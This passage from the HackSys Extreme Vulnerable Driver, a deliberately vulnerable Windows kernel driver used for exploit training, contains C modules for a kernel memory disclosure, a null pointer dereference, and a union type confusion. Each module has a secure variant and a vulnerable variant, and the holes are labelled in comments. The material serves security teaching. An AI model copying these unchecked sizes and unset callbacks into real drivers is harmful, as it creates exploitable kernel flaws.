LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    MemoryDisclosureNonPagedPoolNx.c

Abstract:
    This module implements the functions to demonstrate
    memory disclosure in NonPagedPoolNx vulnerability.

--*/

#include "MemoryDisclosureNonPagedPoolNx.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerMemoryDisclosureNonPagedPoolNx)
#pragma alloc_text(PAGE, MemoryDisclosureNonPagedPoolNxIoctlHandler)
#endif // ALLOC_PRAGMA


/// <summary>
/// Trigger the Memory Disclosure in NonPagedPoolNx Vulnerability
/// </summary>
/// <param name="UserOutputBuffer">The pointer to user mode output buffer</param>
/// <param name="Size">Size of the user mode buffer</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerMemoryDisclosureNonPagedPoolNx(
    _In_ PVOID UserOutputBuffer,
    _In_ SIZE_T Size
)
{
    PVOID KernelBuffer = NULL;
    NTSTATUS Status = STATUS_SUCCESS;

    PAGED_CODE();

    __try
    {
        DbgPrint("[+] Allocating Pool chunk\n");

        //
        // Allocate Pool chunk
        //

        KernelBuffer = ExAllocatePoolWithTag(
            NonPagedPoolNx,
            (SIZE_T)POOL_BUFFER_SIZE,
            (ULONG)POOL_TAG
        );

        if (!KernelBuffer)
        {
            //
            // Unable to allocate Pool chunk
            //
            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPoolNx));
            DbgPrint("[+] Pool Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);
        }

        //
        // Work on the kernel buffer
        //

        RtlFillMemory(KernelBuffer, (SIZE_T)POOL_BUFFER_SIZE, 0x41);

        //
        // After working on the kernel buffer, it's time to give
        // the output to the user
        //

        //
        // Verify if the output buffer resides in user mode
        //

        ProbeForWrite(UserOutputBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR));

        DbgPrint("[+] UserOutputBuffer: 0x%p\n", UserOutputBuffer);
        DbgPrint("[+] UserOutputBuffer Size: 0x%zX\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%zX\n", (SIZE_T)POOL_BUFFER_SIZE);

#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy().
        // Hence, there will be no out of bound read of kernel mode memory
        //

        RtlCopyMemory(UserOutputBuffer, KernelBuffer, (SIZE_T)POOL_BUFFER_SIZE);
#else
        DbgPrint("[+] Triggering Memory Disclosure in NonPagedPoolNx\n");

        //
        // Vulnerability Note: This is a vanilla memory disclosure vulnerability
        // because the developer is passing the user supplied value directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of the allocated Pool chunk which will result in reading
        // more data from kernel mode and passing to user mode memory which causes memory
        // disclosure vulnerability
        //

        RtlCopyMemory(UserOutputBuffer, KernelBuffer, Size);
#endif

        if (KernelBuffer)
        {
            DbgPrint("[+] Freeing Pool chunk\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelBuffer);

            //
            // Free the allocated Pool chunk
            //

            ExFreePoolWithTag(KernelBuffer, (ULONG)POOL_TAG);
            KernelBuffer = NULL;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Memory Disclosure NonPagedPoolNx Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
MemoryDisclosureNonPagedPoolNxIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserOutputBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserOutputBuffer = Irp->UserBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.OutputBufferLength;

    if (UserOutputBuffer)
    {
        Status = TriggerMemoryDisclosureNonPagedPoolNx(UserOutputBuffer, Size);
    }

    return Status;
}

```

`Driver/HEVD/Windows/MemoryDisclosureNonPagedPoolNx.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    MemoryDisclosureNonPagedPoolNx.h

Abstract:
    This module implements the data structures for
    memory disclosure in NonPagedPoolNx module.

--*/

#pragma once

#ifndef __MEMORY_DISCLOSURE_NON_PAGED_POOL_NX_H__
#define __MEMORY_DISCLOSURE_NON_PAGED_POOL_NX_H__

#include "Common.h"


//
// Defines
//

#define POOL_BUFFER_SIZE 504


//
// Function Definitions
//

NTSTATUS
TriggerMemoryDisclosureNonPagedPoolNx(
    _In_ PVOID UserOutputBuffer,
    _In_ SIZE_T Size
);

#endif  // !__MEMORY_DISCLOSURE_NON_PAGED_POOL_NX_H__

```

`Driver/HEVD/Windows/NullPointerDereference.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    NullPointerDereference.c

Abstract:
    This module implements the functions to demonstrate
    Null Pointer Dereference vulnerability.

--*/

#include "NullPointerDereference.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerNullPointerDereference)
#pragma alloc_text(PAGE, NullPointerDereferenceIoctlHandler)
#pragma alloc_text(PAGE, NullPointerDereferenceObjectCallback)
#endif // ALLOC_PRAGMA


/// <summary>
/// Null Pointer Dereference Object Callback
/// </summary>
VOID
NullPointerDereferenceObjectCallback(
    VOID
)
{
    PAGED_CODE();

    DbgPrint("[+] Null Pointer Dereference Object Callback\n");
}


/// <summary>
/// Trigger the Null Pointer Dereference Vulnerability
/// </summary>
/// <param name="UserBuffer">The pointer to user mode buffer</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerNullPointerDereference(
    _In_ PVOID UserBuffer
)
{
    ULONG UserValue = 0;
    ULONG MagicValue = 0xBAD0B0B0;
    NTSTATUS Status = STATUS_SUCCESS;
    PNULL_POINTER_DEREFERENCE NullPointerDereference = NULL;

    PAGED_CODE();

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, sizeof(NULL_POINTER_DEREFERENCE), (ULONG)__alignof(UCHAR));

        //
        // Allocate Pool chunk
        //

        NullPointerDereference = (PNULL_POINTER_DEREFERENCE)ExAllocatePoolWithTag(
            NonPagedPool,
            sizeof(NULL_POINTER_DEREFERENCE),
            (ULONG)POOL_TAG
        );

        if (!NullPointerDereference)
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(NULL_POINTER_DEREFERENCE));
            DbgPrint("[+] Pool Chunk: 0x%p\n", NullPointerDereference);
        }

        //
        // Get the value from user mode
        //

        UserValue = *(PULONG)UserBuffer;

        DbgPrint("[+] UserValue: 0x%p\n", UserValue);
        DbgPrint("[+] NullPointerDereference: 0x%p\n", NullPointerDereference);

        //
        // Validate the magic value
        //

        if (UserValue == MagicValue)
        {
            NullPointerDereference->Value = UserValue;
            NullPointerDereference->Callback = &NullPointerDereferenceObjectCallback;

            DbgPrint("[+] NullPointerDereference->Value: 0x%p\n", NullPointerDereference->Value);
            DbgPrint("[+] NullPointerDereference->Callback: 0x%p\n", NullPointerDereference->Callback);
        }
        else
        {
            DbgPrint("[+] Freeing NullPointerDereference Object\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", NullPointerDereference);

            //
            // Free the allocated Pool chunk
            //

            ExFreePoolWithTag((PVOID)NullPointerDereference, (ULONG)POOL_TAG);

            //
            // Set to NULL to avoid dangling pointer
            //

            NullPointerDereference = NULL;
        }

#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is checking if
        // 'NullPointerDereference' is not NULL before calling the callback function
        //

        if (NullPointerDereference)
        {
            NullPointerDereference->Callback();
        }
#else
        DbgPrint("[+] Triggering Null Pointer Dereference\n");

        //
        // Vulnerability Note: This is a vanilla Null Pointer Dereference vulnerability
        // because the developer is not validating if 'NullPointerDereference' is NULL
        // before calling the callback function
        //

        NullPointerDereference->Callback();
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Null Pointer Dereference Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
NullPointerDereferenceIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (UserBuffer)
    {
        Status = TriggerNullPointerDereference(UserBuffer);
    }

    return Status;
}

```

`Driver/HEVD/Windows/NullPointerDereference.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    NullPointerDereference.h

Abstract:
    This module implements the data structures for
    null pointer dereference module.

--*/

#pragma once

#ifndef __NULL_POINTER_DEREFERENCE_H__
#define __NULL_POINTER_DEREFERENCE_H__

#include "Common.h"


//
// Structures
//

typedef struct _NULL_POINTER_DEREFERENCE
{
    ULONG Value;
    FunctionPointer Callback;
} NULL_POINTER_DEREFERENCE, *PNULL_POINTER_DEREFERENCE;


//
// Function Definitions
//

VOID
NullPointerDereferenceObjectCallback(
    VOID
);

NTSTATUS
TriggerNullPointerDereference(
    _In_ PVOID UserBuffer
);

#endif  // !__NULL_POINTER_DEREFERENCE_H__

```

`Driver/HEVD/Windows/TypeConfusion.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    TypeConfusion.c

Abstract:
    This module implements the functions to demonstrate
    Type Confusion vulnerability due to improper use of
    UNION construct.

--*/

#include "TypeConfusion.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerTypeConfusion)
#pragma alloc_text(PAGE, TypeConfusionIoctlHandler)
#pragma alloc_text(PAGE, TypeConfusionObjectCallback)
#pragma alloc_text(PAGE, TypeConfusionObjectInitializer)
#endif // ALLOC_PRAGMA


/// <summary>
/// Type Confusion Object Callback
/// </summary>
VOID
TypeConfusionObjectCallback(
    VOID
)
{
    PAGED_CODE();

    DbgPrint("[+] Type Confusion Object Callback\n");
}


/// <summary>
/// Type Confusion Object Initializer
/// </summary>
/// <param name="KernelTypeConfusionObject">The pointer to KERNEL_TYPE_CONFUSION_OBJECT object</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TypeConfusionObjectInitializer(
    _In_ PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject
)
{
    NTSTATUS Status = STATUS_SUCCESS;

    PAGED_CODE();

    DbgPrint("[+] KernelTypeConfusionObject->Callback: 0x%p\n", KernelTypeConfusionObject->Callback);
    DbgPrint("[+] Calling Callback\n");

    KernelTypeConfusionObject->Callback();

    DbgPrint("[+] Kernel Type Confusion Object Initialized\n");

    return Status;
}


/// <summary>
/// Trigger the Type Confusion Vulnerability
/// </summary>
/// <param name="UserTypeConfusionObject">The pointer to USER_TYPE_CONFUSION_OBJECT object</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerTypeConfusion(
    _In_ PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject = NULL;

    PAGED_CODE();

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(
            UserTypeConfusionObject,
            sizeof(USER_TYPE_CONFUSION_OBJECT),
            (ULONG)__alignof(UCHAR)
        );

        //
        // Allocate Pool chunk
        //

        KernelTypeConfusionObject = (PKERNEL_TYPE_CONFUSION_OBJECT)ExAllocatePoolWithTag(
            NonPagedPool,
            sizeof(KERNEL_TYPE_CONFUSION_OBJECT),
            (ULONG)POOL_TAG
        );

        if (!KernelTypeConfusionObject)
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(KERNEL_TYPE_CONFUSION_OBJECT));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelTypeConfusionObject);
        }

        DbgPrint("[+] UserTypeConfusionObject: 0x%p\n", UserTypeConfusionObject);
        DbgPrint("[+] KernelTypeConfusionObject: 0x%p\n", KernelTypeConfusionObject);
        DbgPrint("[+] KernelTypeConfusionObject Size: 0x%zX\n", sizeof(KERNEL_TYPE_CONFUSION_OBJECT));

        KernelTypeConfusionObject->ObjectID = UserTypeConfusionObject->ObjectID;
        KernelTypeConfusionObject->ObjectType = UserTypeConfusionObject->ObjectType;

        DbgPrint("[+] KernelTypeConfusionObject->ObjectID: 0x%p\n", KernelTypeConfusionObject->ObjectID);
        DbgPrint("[+] KernelTypeConfusionObject->ObjectType: 0x%p\n", KernelTypeConfusionObject->ObjectType);


#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is properly setting 'Callback'
        // member of the 'KERNEL_TYPE_CONFUSION_OBJECT' structure before passing the pointer
        // of 'KernelTypeConfusionObject' to 'TypeConfusionObjectInitializer()' function as
        // parameter
        //

        KernelTypeConfusionObject->Callback = &TypeConfusionObjectCallback;
        Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);
#else
        DbgPrint("[+] Triggering Type Confusion\n");

        //
        // Vulnerability Note: This is a vanilla Type Confusion vulnerability due to improper
        // use of the 'UNION' construct. The developer has not set the 'Callback' member of
        // the 'KERNEL_TYPE_CONFUSION_OBJECT' structure before passing the pointer of
        // 'KernelTypeConfusionObject' to 'TypeConfusionObjectInitializer()' function as
        // parameter
        //

        Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);
#endif

        DbgPrint("[+] Freeing KernelTypeConfusionObject Object\n");
        DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
        DbgPrint("[+] Pool Chunk: 0x%p\n", KernelTypeConfusionObject);

        //
        // Free the allocated Pool chunk
        //

        ExFreePoolWithTag((PVOID)KernelTypeConfusionObject, (ULONG)POOL_TAG);
        KernelTypeConfusionObject = NULL;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Type Confusion Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TypeConfusionIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = NULL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserTypeConfusionObject = (PUSER_TYPE_CONFUSION_OBJECT)IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (UserTypeConfusionObject)
    {
        Status = TriggerTypeConfusion(UserTypeConfusionObject);
    }

    return Status;
}

```

`Driver/HEVD/Windows/TypeConfusion.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    TypeConfusion.h

Abstract:
    This module implements the data structures for
    type confusion module.

--*/

#pragma once

#ifndef __TYPE_CONFUSION_H__
#define __TYPE_CONFUSION_H__

#include "Common.h"


//
// Structures
//

typedef struct _USER_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR ObjectID;
    ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT;

#pragma warning(push)
#pragma warning(disable : 4201)
typedef struct _KERNEL_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR ObjectID;
    union
    {
        ULONG_PTR ObjectType;
        FunctionPointer Callback;
    };
} KERNEL_TYPE_CONFUSION_OBJECT, *PKERNEL_TYPE_CONFUSION_OBJECT;
#pragma warning(pop)


//
// Function Definitions
//

VOID
TypeConfusionObjectCallback(
    VOID
);

NTSTATUS
TriggerTypeConfusion(
    _In_ PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject
);

NTSTATUS
TypeConfusionObjectInitializer(
    _In_ PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject
);

#endif  // !__TYPE_CONFUSION_H__

```

`Driver/HEVD/Windows/UninitializedMemoryPagedPool.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedMemoryPagedPool.c

Abstract:
    This module implements the functions to demonstrate
    use of uninitialized memory in PagedPool vulnerability.

--*/

#include "UninitializedMemoryPagedPool.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerUninitializedMemoryPagedPool)
